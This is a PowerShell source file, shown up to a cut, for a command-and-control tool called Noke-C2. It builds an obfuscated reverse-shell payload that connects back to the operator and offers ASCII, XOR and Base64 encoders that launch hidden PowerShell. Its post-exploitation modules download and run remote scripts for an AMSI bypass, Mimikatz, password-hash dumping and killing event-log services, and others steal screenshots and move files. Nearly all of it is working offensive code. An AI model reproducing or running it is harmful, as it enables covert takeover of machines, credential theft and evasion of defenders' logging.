function Noke-C2 
{

function Character_Obfuscation($String)
{
  $String = $String.toCharArray();
  
  Foreach($Letter in $String) 
  {
    $RandomNumber = (1..2) | Get-Random;
    
    If($RandomNumber -eq "1")
    {
      $Letter = "$Letter".ToLower();
    }

    If($RandomNumber -eq "2")
    {
      $Letter = "$Letter".ToUpper();
    }

    $RandomString += $Letter;
    $RandomNumber = $Null;
  }
  
  $String = $RandomString;
  Return $String;
}

function Variable_Obfuscation($String)
{
  $RandomVariable = (0..99);

  For($i = 0; $i -lt $RandomVariable.count; $i++)
  {
    $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));

    While($RandomVariable -like "$Temp")
    {
      $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));
    }

    $RandomVariable[$i] = $Temp;
    $Temp = $Null;
  }

  $RandomString = $String;

  For($x = $RandomVariable.count; $x -ge 1; $x--)
  {
  	$Temp = $RandomVariable[$x-1];
    $RandomString = "$RandomString" -replace "\`$$x", "`$$Temp";
  }

  $String = $RandomString;
  Return $String;
}

function ASCII_Obfuscation($String)
{
  $PowerShell = "IEX(-Join((@)|%{[char]`$_}));Exit";
  $CMD = "ECHO `"IEX(-Join((@)|%{[char]```$_}));Exit`" | PowerShell -nop -w hidden -c `"IEX(IEX(`$input))`"&Exit";
  
  $String = [System.Text.Encoding]::ASCII.GetBytes($String) -join ',';
  
  $PowerShell = Character_Obfuscation($PowerShell);
  $PowerShell = $PowerShell -replace "@","$String";

  $CMD = Character_Obfuscation($CMD);
  $CMD = $CMD -replace "@","$String";
  
  Return $PowerShell,$CMD;
}

function Base64_Obfuscation($String)
{
  $PowerShell = "IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(([Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes({@})|Sort-Object {Get-Random -SetSeed #}))))));Exit";
  $CMD = "ECHO `"IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(([Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes({@})|Sort-Object {Get-Random -SetSeed #}))))));Exit`" | PowerShell -nop -w hidden -c `"IEX(IEX(`$input))`"&Exit";
  
  $Seed = (Get-Random -Minimum 0 -Maximum 999999999).ToString('000000000');
  $String = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes([Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($String))) | Sort-Object {Get-Random -SetSeed $Seed}));
  
  $PowerShell = Character_Obfuscation($PowerShell);
  $PowerShell = $PowerShell -replace "@","$String";
  $PowerShell = $PowerShell -replace "#","$Seed";

  $CMD = Character_Obfuscation($CMD);
  $CMD = $CMD -replace "@","$String";
  $CMD = $CMD -replace "#","$Seed";

  Return $PowerShell,$CMD;
}

function BXOR_Obfuscation($String)
{

  $finalcmdline = "ASC" + "II" -join ''
  $PowerShell = "I`E`X(-Jo" + "in((@)|%{[char](`$_-BX" + "OR #)}));Exit" -join ''
  $CMD = "ECHO `"IEX(-Join((@)|%{[char](```$_-BXOR #)}));Exit`" | PowerShell -nop -w hidden -c `"IEX(IEX(`$input))`"&Exit";

  $Key = '0x' + ((0..5) | Get-Random) + ((0..9) + ((65..70) + (97..102) | % {[char]$_}) | Get-Random);Start-Sleep -Milliseconds 30
  (  '!'|%  {${~ }=  +$()}{  ${ /'}=${~ }}  {${) }  =  ++  ${~ }}{  ${;.*}=(  ${~ }=${~ }+  ${) })  }{  ${)#+}  =(${~ }  =  ${~ }  +  ${) }  )}  {  ${~(}=(${~ }=  ${~ }  +  ${) }  )  }{  ${*-}=  (${~ }  =${~ }+${) })}{${()``}=(${~ }=  ${~ }  +  ${) }  )}  {${]/!}=  (  ${~ }  =  ${~ }  +  ${) })}  {${# }  =  (${~ }  =  ${~ }+  ${) }  )  }{${*;}  =  (${~ }=  ${~ }+  ${) }  )}  {${/}  ="["+  "$(@{  })"[  ${]/!}  ]+  "$(@{  })"["${) }${*;}"]+  "$(  @{  }  )"[  "${;.*}${ /'}"]+"$?  "[  ${) }  ]  +  "]"  }{${~ }  =  "".("$(@{})  "["${) }${~(}"  ]+"$(  @{  })  "["${) }${()``}"]+"$(  @{  })  "[  ${ /'}]  +  "$(  @{  }  )"[  ${~(}  ]+  "$?  "[  ${) }]+  "$(@{  }  )"[${)#+}]  )  }  {  ${~ }="$(@{})"[  "${) }${~(}"]  +"$(@{  })"[  ${~(}  ]+  "${~ }"[  "${;.*}${]/!}"  ]  }  )  ;  .${~ }(  "  ${/}${)#+}${()``}+  ${/}${# }${)#+}+  ${/}${) }${) }${()``}+${/}${) }${) }${~(}  +${/}${) }${ /'}${*-}+${/}${) }${) }${ /'}  +  ${/}${) }${ /'}${)#+}  +${/}${)#+}${;.*}  +  ${/}${()``}${) }+  ${/}${)#+}${;.*}  +${/}${)#+}${()``}+  ${/}${~(}${ /'}  +  ${/}${*;}${) }+${/}${# }${)#+}  +  ${/}${) }${;.*}${) }+  ${/}${) }${) }${*-}+${/}${) }${) }${()``}  +  ${/}${) }${ /'}${) }+  ${/}${) }${ /'}${*;}+${/}${~(}${()``}  +  ${/}${# }${~(}+${/}${) }${ /'}${) }+  ${/}${) }${;.*}${ /'}+${/}${) }${) }${()``}+${/}${~(}${()``}  +${/}${()``}${*;}  +${/}${) }${) }${ /'}  +  ${/}${*;}${*;}  +  ${/}${) }${) }${) }  +  ${/}${) }${ /'}${ /'}  +${/}${) }${ /'}${*-}  +${/}${) }${) }${ /'}+  ${/}${) }${ /'}${)#+}+  ${/}${*;}${)#+}+  ${/}${*-}${# }+${/}${*-}${# }  +  ${/}${)#+}${()``}+  ${/}${) }${ /'}${;.*}  +  ${/}${) }${ /'}${*-}  +  ${/}${) }${) }${ /'}  +  ${/}${*;}${]/!}  +${/}${) }${ /'}${# }  +${/}${*;}${*;}+${/}${) }${ /'}${*;}  +  ${/}${) }${ /'}${ /'}+  ${/}${) }${ /'}${# }+${/}${) }${ /'}${*-}+${/}${) }${) }${ /'}  +${/}${) }${ /'}${) }+  ${/}${~(}${()``}+  ${/}${]/!}${) }+  ${/}${) }${ /'}${) }+${/}${) }${) }${()``}+${/}${()``}${()``}  +  ${/}${) }${;.*}${) }  +  ${/}${) }${) }${()``}+  ${/}${) }${ /'}${) }+  ${/}${) }${) }${*-}+  ${/}${~(}${ /'}  +${/}${)#+}${()``}+${/}${# }${)#+}  +${/}${) }${) }${()``}  +${/}${) }${) }${~(}  +  ${/}${) }${ /'}${*-}+${/}${) }${) }${ /'}  +  ${/}${) }${ /'}${)#+}+${/}${~(}${) }+  ${/}${) }${;.*}${~(}+  ${/}${)#+}${]/!}+${/}${) }${;.*}${)#+}  +${/}${)#+}${()``}+  ${/}${*;}${*-}+  ${/}${)#+}${;.*}+${/}${~(}${*-}  +${/}${()``}${()``}  +${/}${# }${# }  +${/}${]/!}${*;}  +  ${/}${# }${;.*}+${/}${)#+}${;.*}  +${/}${)#+}${()``}  +${/}${]/!}${*-}  +  ${/}${) }${ /'}${) }+${/}${) }${;.*}${) }  +  ${/}${) }${;.*}${*-}  +  ${/}${~(}${) }+  ${/}${)#+}${;.*}  +  ${/}${~(}${*-}  +${/}${) }${ /'}${()``}  +${/}${) }${) }${) }  +  ${/}${) }${ /'}${*-}+  ${/}${) }${) }${ /'}  +  ${/}${)#+}${;.*}+  ${/}${)#+}${*;}+${/}${~(}${~(}+${/}${)#+}${*;}|${~ }")
  
  $PowerShell = Character_Obfuscation($PowerShell);
  $PowerShell = $PowerShell -replace "@","$String";
  $PowerShell = $PowerShell -replace "#","$Key";

  $CMD = Character_Obfuscation($CMD);
  $CMD = $CMD -replace "@","$String";
  $CMD = $CMD -replace "#","$Key";

  Return $PowerShell,$CMD;
}

function Payload($IP,$Port,$Base64_Key)
{
  $dadoninho = "Fr`omB" + "ase`6" + "4Str`ing" -Join ''
  $Payload = "`$1=[System.Byte[]]::CreateInstance([System.Byte],1024);`$2=([Convert]::FromBase64String(`"@`"));`$3=`"#`";`$4=IEX([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((`$3|ConvertTo-SecureString -Key `$2))));While(`$5=`$4.GetStream()){;While(`$5.DataAvailable -or `$6 -eq `$1.count){;`$6=`$5.Read(`$1,0,`$1.length);`$7+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$1,0,`$6)};If(`$7){;`$8=(IEX(`$7)2>&1|Out-String);If(!(`$8.length%`$1.count)){;`$8+=`" `"};`$9=([text.encoding]::ASCII).GetBytes(`$8);`$5.Write(`$9,0,`$9.length);`$5.Flush();`$7=`$Null}}";

  $Key = $([System.Convert]::$dadoninho($Base64_Key))
  $C2 = ConvertTo-SecureString "New-Object System.Net.Sockets.TCPClient('$IP',$Port)" -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;

  $Payload = Variable_Obfuscation(Character_Obfuscation($Payload));
  $Payload = $Payload -replace "@","$Base64_Key";
  $Payload = $Payload -replace "#","$C2";

  Return $Payload;
}

$Banner = @"
 ________   ________  ___  __    _______              ________   _______     
|\   ___  \|\   __  \|\  \|\  \ |\  ___ \            |\   ____\ /  ___  \    
\ \  \\ \  \ \  \|\  \ \  \/  /|\ \   __/|           \ \  \___|/__/|_/  /|   
 \ \  \\ \  \ \  \\\  \ \   ___  \ \  \_|/__          \ \  \   |__|//  / / NokeC2 v2.7  
  \ \  \\ \  \ \  \\\  \ \  \\ \  \ \  \_|\ \          \ \  \____  /  /_/__  
   \ \__\\ \__\ \_______\ \__\\ \__\ \_______\          \ \_______\\________\
    \|__| \|__|\|_______|\|__| \|__|\|_______|           \|_______|\|_______|                                                                             
                                                                                -By: @_MrNiko
"@;

$infoModules = @"
  
  Info-Modules
  -----------
  Info            Show System Info.
  Version         Show The Version Of the Tool(C2).
  Author          Print Author Name In ASCII Text.
  Clear           To See Clear The Shell And Show The Modules.
  Exit            Exit The C2-Server And Powershell.

"@;

$Simple_module = @"
  
  Simple-Modules
  -------------
  Upload          Upload File from Local to Remote-Host.
  Download        Download File from Remote-Host to Local.
  Screenshot      Save Screenshot from Remote-Host to Local.

"@

$PostExploition = @"
  
  Post-Exploition
  --------------
  LNK             Load The Custom LNK Module To Edit The Lnk Files.
  Phantom         Kills All The Event Log Service Process (Priv Required).
  SharpKatz       Run SharpKatz In Powershell (Priv Required).
  mimikatz        Run Mimikatgz In Powershell With Both Amsi Bypass (Priv Required).
  PowerDump       Run PowerDump In Powershell (Priv Required).
  SeatBelt        Run Seatbelt In Powersshell.
  PowerUp         Run PowerUP In Powershell.
  Certify         Load Certify Tool In Memory In Powershell Process.
  NetCat          Netcat is a tool that uses for TCP and UDP connections in a network.
  Rubeus          Run Rubeus In Powershell.
  TestPrivEsc     Test-PrivEsc If The System is Vulnerable.
"@

$Bypasses = @"
  
  Bypass
  -------
  AMSI            Bypass The Amsi In The Memory.

"@



Clear-Host;
Write-Host $Banner -ForegroundColor Cyan; Write-Host $infoModules -ForeGroundColor Gray; Write-host $Simple_module -ForeGroundColor Cyan; Write-Host $PostExploition -ForeGroundColor red; Write-Host $Bypasses -ForeGroundColor yellow;
$IPATH = "$pwd\"
Write-Host ":" -NoNewline -ForegroundColor red; Write-Host "(Local-Host)" -NoNewline -ForegroundColor DarkCyan; Write-Host "::> " -NoNewline -ForegroundColor red;
$Local_Host = Read-Host;

While(!($Local_Port))
{
  Write-Host ":" -NoNewline -ForegroundColor red; Write-Host "(Local-Port)" -NoNewline -ForegroundColor DarkCyan; Write-Host "::> " -NoNewline -ForegroundColor red;
  $Local_Port = Read-Host;

  netstat -na | Select-String LISTENING | % {
  
  If(($_.ToString().split(":")[1].split(" ")[0]) -eq "$Local_Port")
  {
    $Local_Port = $Null;
  }
 }
}

$viriatoshepard = ("T@oB@a" + "s@e6@4St@" + "r@i@n@g" -join '') -replace '@',''
$Key = (1..32 | % {[byte](Get-Random -Minimum 0 -Maximum 255)});
$Base64_Key = $([System.Convert]::$viriatoshepard($Key));

Write-Host "`n[*] Generating Payload ✔" -ForegroundColor green;
$Payload = Payload -IP $Local_Host -Port $Local_Port -Base64_Key $Base64_Key;

$Choices = (1..3);

While(!($Choices -like "$Choice"))
{

  Write-Host "`n 1." -NoNewline -ForegroundColor yellow; Write-Host " ->>" -NoNewline -ForegroundColor red; Write-Host " ASCII" -ForegroundColor blue;
  Write-Host " 2." -NoNewline -ForegroundColor yellow; Write-Host " ->>" -NoNewline -ForegroundColor red; Write-Host " XOR" -ForegroundColor Cyan;
  Write-Host " 3." -NoNewline -ForegroundColor yellow; Write-Host " ->>" -NoNewline -ForegroundColor red; Write-Host " Base64" -ForegroundColor Magenta;

  Write-Host "`n >>> " -NoNewline -ForegroundColor blue;
  $Choice = Read-Host;
}

Clear-Host;
Write-Host $Banner -ForegroundColor Cyan; Write-Host $infoModules -ForeGroundColor Gray; Write-host $Simple_module -ForeGroundColor Cyan; Write-Host $PostExploition -ForeGroundColor red; Write-Host $Bypasses -ForeGroundColor yellow;

Write-Host " - Local Host: $Local_Host"  -ForegroundColor yellow;
Write-Host " - Local Port: $Local_Port"  -ForegroundColor yellow;

If($Choice -eq "1")
{
  Write-Host "`n [*] Obfuscation Type: ASCII ✔" -ForegroundColor Magenta;
  $Payload = ASCII_Obfuscation($Payload);
}

If($Choice -eq "2")
{
  Write-Host "`n [*] Obfuscation Type: XOR ✔" -ForegroundColor Magenta;
  $Payload = BXOR_Obfuscation($Payload);
}

If($Choice -eq "3")
{
  Write-Host "`n [*] Obfuscation Type: Base64 ✔" -ForegroundColor Magenta;
  $Payload = Base64_Obfuscation($Payload);
}

$PowerShell_Payload = $Payload[0];
$CMD_Payload = $Payload[1];

Write-Host "`n [*] PowerShell Payload: [*]`n`n$PowerShell_Payload" -ForegroundColor blue;
Write-Host "`n [*] CMD Payload: [*]`n`n$CMD_Payload`n" -ForegroundColor DarkGray;

$ola = 'Creat' + 'eInstance' -join ''
$Bytes = [System.Byte[]]::$ola([System.Byte],1024);
Write-Host "`n [*] Listeneing on Port $Local_Port";
${/$.}=+$(  )  ;  ${).!}  =${/$.}  ;${#~}  =  ++  ${/$.}  ;  ${[/}  =(  ${/$.}  =${/$.}  +  ${#~}  )  ;${.-}  =  (  ${/$.}  =${/$.}+  ${#~}  );  ${.$)}=  (${/$.}  =  ${/$.}  +${#~}  )  ;${/@}  =  (${/$.}  =${/$.}+${#~}  )  ;${)/}=(${/$.}=${/$.}+${#~}  )  ;  ${#-*}  =(  ${/$.}=  ${/$.}+  ${#~});${;}=  (${/$.}  =${/$.}+  ${#~}  )  ;${``[@}  =  (${/$.}  =  ${/$.}+${#~}  )  ;${[}=  "["  +  "$(  @{}  )  "[${#-*}]+  "$(@{  })"[  "${#~}"  +  "${``[@}"]+"$(  @{}  )  "["${[/}"  +  "${).!}"]+  "$?"[${#~}  ]  +  "]"  ;${/$.}  =  "".("$(@{  })  "[  "${#~}${.$)}"]+"$(@{  })"["${#~}${)/}"]+"$(  @{  }  )  "[  ${).!}  ]  +"$(  @{  })  "[${.$)}]  +"$?  "[${#~}  ]+"$(  @{})  "[${.-}]  )  ;  ${/$.}=  "$(  @{  }  )  "["${#~}"+  "${.$)}"]  +  "$(  @{})  "[  ${.$)}  ]  +"${/$.}"[  "${[/}"  +"${#-*}"]  ;&${/$.}  ("  ${/$.}  (${[}${.-}${)/}+  ${[}${;}${.-}+  ${[}${#~}${#~}${#~}+${[}${``[@}${``[@}  +  ${[}${#~}${).!}${#-*}+  ${[}${#~}${).!}${#~}+${[}${#~}${#~}${)/}+${[}${.-}${[/}+  ${[}${)/}${#~}  +${[}${.-}${[/}+${[}${#-*}${;}  +${[}${#~}${).!}${#~}  +${[}${#~}${#~}${``[@}+  ${[}${.$)}${/@}+${[}${#-*}${``[@}+  ${[}${``[@}${;}+  ${[}${#~}${).!}${)/}  +${[}${#~}${).!}${#~}  +  ${[}${``[@}${``[@}  +${[}${#~}${#~}${)/}  +${[}${.-}${[/}  +${[}${;}${.-}+${[}${#~}${[/}${#~}  +${[}${#~}${#~}${/@}+${[}${#~}${#~}${)/}  +${[}${#~}${).!}${#~}+  ${[}${#~}${).!}${``[@}  +  ${[}${.$)}${)/}  +  ${[}${#-*}${;}  +  ${[}${#~}${).!}${#~}+  ${[}${#~}${#~}${)/}  +  ${[}${.$)}${)/}+  ${[}${;}${.-}  +  ${[}${#~}${#~}${#~}+${[}${``[@}${``[@}+${[}${#~}${).!}${#-*}+  ${[}${#~}${).!}${#~}  +  ${[}${#~}${#~}${)/}  +${[}${#~}${#~}${/@}  +${[}${.$)}${)/}  +  ${[}${;}${.$)}  +${[}${``[@}${``[@}  +  ${[}${#~}${#~}${[/}+  ${[}${#-*}${)/}+  ${[}${#~}${).!}${/@}+${[}${#~}${#~}${/@}  +  ${[}${#~}${#~}${)/}+${[}${#~}${).!}${#~}  +${[}${#~}${#~}${).!}  +  ${[}${#~}${).!}${#~}  +${[}${#~}${#~}${.$)}  +  ${[}${.$)}${).!}+${[}${.-}${``[@}  +${[}${.$)}${;}+${[}${.$)}${)/}  +${[}${.$)}${;}  +${[}${.$)}${)/}  +  ${[}${.$)}${;}  +  ${[}${.$)}${)/}+  ${[}${.$)}${;}  +  ${[}${.-}${``[@}  +${[}${.$)}${.$)}  +  ${[}${.-}${)/}+  ${[}${#-*}${)/}+${[}${#~}${#~}${#~}+  ${[}${``[@}${``[@}+${[}${``[@}${#-*}  +${[}${#~}${).!}${;}+  ${[}${``[@}${/@}  +${[}${;}${).!}  +${[}${#~}${#~}${#~}  +${[}${#~}${#~}${.$)}+${[}${#~}${#~}${)/}  +  ${[}${.$)}${#~}  +${[}${/@}${``[@}  )")
$Socket.Start();
$Client = $Socket.AcceptTcpClient();
$Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString;
Write-Host " [-] Beacon Received: $Remote_Host" -ForegroundColor Green

$Stream = $Client.GetStream();
$WaitData = $False;
$Info = $Null;

$RhostWorkingDir = Character_Obfuscation("(Get-location).Path");
$Processor = Character_Obfuscation("(Get-WmiObject Win32_processor).Caption");
$Name = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).CSName");
$System = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).Caption");
$Version = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).Version");
$serial = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SerialNumber");
$syst_dir = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SystemDirectory");
$Architecture = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).OSArchitecture");
$WindowsDirectory = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).WindowsDirectory");
$RegisteredUser = Character_Obfuscation("(Get-CimInstance -ClassName Win32_OperatingSystem).RegisteredUser");
$BootUpTime = Character_Obfuscation("(Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime.ToString()");


#Sysinfo command at first time run (connection)
$Command = "cd `$env:tmp;`"`n   DomainName     : `"+$Name+`"``n   RemoteHost     : `"+`"$Remote_Host`"+`"``n   BootUpTime     : `"+$BootUpTime+`"``n   RegisteredUser : `"+$RegisteredUser+`"``n   OP System      : `"+$System+`"``n   OP Version     : `"+$Version+`"``n   Architecture   : `"+$Architecture+`"``n   WindowsDir     : `"+$WindowsDirectory+`"``n   SystemDir      : `"+$syst_dir+`"``n   SerialNumber   : `"+$serial+`"``n   WorkingDir     : `"+$RhostWorkingDir+`"``n   ProcessorCPU   : `"+$Processor;echo `"`";Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,PasswordChangeable|ft -AutoSize;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";

While($Client.Connected)
{
  If(!($WaitData))
  {
    If(!($Command))
    {
      Write-Host ":" -NoNewline -ForegroundColor red; Write-Host "(Noke-C2)" -NoNewline -ForegroundColor DarkCyan; Write-Host "::> " -NoNewline -ForegroundColor red;
      $Command = Read-Host;
    }


If($Command -ieq "Amsi" -or $Command -ieq "Am")
  {
      write-host "* Bypass Amsi In Powershell Process..!!" -ForeGroundColor green
      $Command = "iex(new-object net.webclient).downloadstring('https://gist.githubusercontent.com/icyguider/664448f6c4284fbd6fecf70ee795a90f/raw/c0cc54f9b46f9c8be9d4516747f700027131218c/demoab.ps1')"
  }

If($Command -ieq "Certify" -or $Command -ieq "Cer")
  {
    Write-Host "* Loading Certify In Memory In Powershell Process..!!" -ForeGroundColor green
    Write-Host "Usage:- Invoke-Certify -Command '/help'" -ForeGroundColor yellow
    $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')"
  }

If($Command -ieq "LNK")
  {
    Write-Host "* Loding Custom LNK Module To Edit LNK Files.!!" -ForeGroundColor green
    Write-Host "Usage:- LNK -Path .\file.lnk -Command 'echo MrNiko'" -ForeGroundColor yellow
    $Command = "iex(new-object net.webclient).downloadstring('https://gist.githubusercontent.com/0xMrNiko/4bb055e6fb453df1e98e5e97c3f51ba5/raw/0a7798a5ce7485026d23b210cc76306b24068ec7/LNK.ps1')"
  }

If($Command -ieq "SharpKatz" -or $Command -ieq "Sk")
  {
    Write-Host "* Running Powershell SharpKatz (Priv Required)" -ForeGroundColor green
    $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1');Invoke-SharpKatz"
  }

If($Command -ieq "Mimikarz" -or $Command -ieq "Mimi")
  {
    Write-Host "* Running Powershell Version Of Mimikatz (Priv Required)" -ForeGroundColor green
    $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
  }

If($Command -ieq "Seatbelt" -or $Command -ieq "SB")
  {
      Write-Host "* Running Powershell Invoke-Seatbelt Version" -ForeGroundColor green
      Write-Host "** Usage:- Invoke-Seatbelt -Command '--help' " -ForeGroundColor yellow
      Sleep 2
      $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')"
  }

If($Command -ieq "Version")
  {
    Write-Host ""
    Write-Host "Noke C2" -ForeGroundColor green
    Write-Host "-------" -ForeGroundColor yellow
    Write-Host "Version:- 2.7" -ForeGroundColor Cyan
    Write-Host ""
  }

If($Command -ieq "author")
   {
      $author_banner = @"
         +-+ ╔╦╗┬─┐╔╗╔┬┬┌─┌─┐
         |@| ║║║├┬┘║║║│├┴┐│ │
         +-+ ╩ ╩┴└─╝╚╝┴┴ ┴└─┘
"@
$Random = New-Object System.Random
$author_banner -split '' |
  ForEach-Object{
    Write-Host $_ -nonew -ForeGroundColor Darkred
    Start-Sleep -milliseconds $(1 + $Random.Next(100))
   }
   Write-Host ""
}

If($Command -ieq "PowerUp" -or $Command -ieq "Pu")
  {
      Write-Host "* Loading PowerUp in Powershell Process" -ForeGroundColor green
      Write-Host "Usage:- after the script is loaded you can run any function form powerup" -ForeGroundColor yellow
      $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')"
  }


If($Command -ieq "Rubeus" -or $Command -ieq "Ru")
  {
      Write-Host "* Running Powershell Invoke-Rubeus Version" -ForeGroundColor green
      Write-host "Usage:- Invoke-Rubeus -Command '--help'" -ForeGroundColor yellow
      $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')"
  }

If($Command -ieq "NetCat" -or $Command -ieq "Nc")
  {
    Write-Host "* Load Netcat In Powershell Memory." -ForeGroundColor green
    Write-Host "Usage:- Netcat -c 10.1.1.1 -p 443 -e cmd -v" -ForeGroundColor yellow
    $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/netcat.ps1')"
  }

If($Command -ieq "TestPrivEsc" -or $Command -ieq "TP")
  {
    Write-Host "* Testing-PrivEsc If The System is Vulnerable.!!" -ForeGroundColor green
    $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tobor88/PowerShell-Red-Team/master/Test-PrivEsc.ps1');Test-PrivEsc"
  }

If($Command -ieq "PowerDump" -or $Command -ieq "PD")
  {
    Write-Host "* Dumping All User Password Hash." -ForeGroundColor green
    $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-PowerDump.ps1');Invoke-PowerDump"
  }


If($Command -ieq "Phantom" -or $Command -ieq "Pha")
  {
    Write-Host "* Killing All The Event Log Service Process." -ForeGroundColor green
    $Command = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Phantom.ps1');Invoke-Phantom"
  }

    If($Command -eq "Modules")
    {
      Write-Host $Banner -ForegroundColor Cyan; Write-Host $infoModules -ForeGroundColor Gray; Write-host $Simple_module -ForeGroundColor Cyan; Write-Host $PostExploition -ForeGroundColor red; Write-Host $Bypasses -ForeGroundColor yellow;
      $Command = $Null;
    }

    If($Command -eq "Info")
    {
      Write-Host "`n$Info" -ForegroundColor Gray -BackgroundColor Black;
      $Command = $Null;
    }
    
    If($Command -eq "Screenshot" -or $Command -ieq "SS")
    {
      $File = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_});
      Write-Host "`n - Screenshot File: $File.png";
      Write-Host "`n [*] Please Wait ... [*]" -ForegroundColor Cyan;
      $Command = "`$1=`"`$env:temp\#`";Add-Type -AssemblyName System.Windows.Forms;`$2=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`$3=[System.Drawing.Graphics]::FromImage(`$2);`$3.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$2.Size);`$3.Dispose();`$2.Save(`"`$1`");If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ',';Remove-Item -Path `"`$1`" -Force}";
      $Command = Variable_Obfuscation(Character_Obfuscation($Command));
      $Command = $Command -replace "#","$File";
      $File = "$pwd\$File.png";
      $Save = $True;
    }

    If($Command -eq "Download")
    {
      Write-Host "`n - Download File: " -NoNewline;
      $File = Read-Host;

      If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
      {
        Write-Host "`n [*] Please Wait ... [*]" -ForegroundColor Cyan;
        $Command = "`$1=`"#`";If(!(`"`$1`" -like `"*\*`") -and !(`"`$1`" -like `"*/*`")){`$1=`"`$pwd\`$1`"};If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ','}";
        $Command = Variable_Obfuscation(Character_Obfuscation($Command));
        $Command = $Command -replace "#","$File";
        $File = $File.Split('\')[-1];
        $File = $File.Split('/')[-1];
        $File = "$pwd\$File";
        $Save = $True;
      
      } Else {

        Write-Host "`n";
        $File = $Null;
        $Command = $Null;
      }
    }

    If($Command -eq "Upload")
    {
      Write-Host "`n - Upload File: " -NoNewline;
      $File = Read-Host;

      If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
      {
        Write-Host "`n [*] Please Wait ... [*]" -ForegroundColor Cyan;

        If(!("$File" -like "*\*") -and !("$File" -like "*/*"))
        {
          $File = "$pwd\$File";
        }

        If(([System.IO.File]::Exists("$File")))
        {
          $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
          $FileBytes = "($FileBytes)";
          $File = $File.Split('\')[-1];
          $File = $File.Split('/')[-1];
          $Command = "`$1=`"`$pwd\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1 [*]`"}";
          $Command = Variable_Obfuscation(Character_Obfuscation($Command));
          $Command = $Command -replace "#","$File";
          $Command = $Command -replace "@","$FileBytes";
          $Upload = $True;

        } Else {

          Write-Host " [*] Failed ! [*]" -ForegroundColor red -BackgroundColor Black;
          Write-Host " [*] File Missing [*]`n" -ForegroundColor yellow -BackgroundColor Black;
          $Command = $Null;
        }

      } Else {

        Write-Host "`n";
        $Command = $Null;
      }

      $File = $Null;
    }

    If(!([string]::IsNullOrEmpty($Command)))
    {
      If(!($Command.length % $Bytes.count))
      {
        $Command += " ";
      }

      $SendByte = ([text.encoding]::ASCII).GetBytes($Command);

      Try {

        $Stream.Write($SendByte,0,$SendByte.length);
        $Stream.Flush();
      }

      Catch {

        Write-Host "`n [*] Connection Lost ! [*]`n" -ForegroundColor red -BackgroundColor Black;
        $Socket.Stop();
        $Client.Close();
        $Stream.Dispose();
        Exit;
      }

      $WaitData = $True;
    }

    If($Command -eq "Exit")
    {
      Write-Host "`n [*] Connection Lost ! [*]`n" -ForegroundColor red -BackgroundColor Black;
      $Socket.Stop();
      $Client.Close();
      $Stream.Dispose();
      Exit;
    }

    If($Command -eq "Clear" -or $Command -eq "Cls" -or $Command -eq "Clear-Host")
    {
      Clear-Host;
      Write-Host $Banner -ForegroundColor Cyan; Write-Host $infoModules -ForeGroundColor Gray; Write-host $Simple_module -ForeGroundColor Cyan; Write-Host $PostExploition -ForeGroundColor red; Write-Host $Bypasses -ForeGroundColor yellow;
    }

    $Command = $Null;
  }

  If($WaitData)
  {
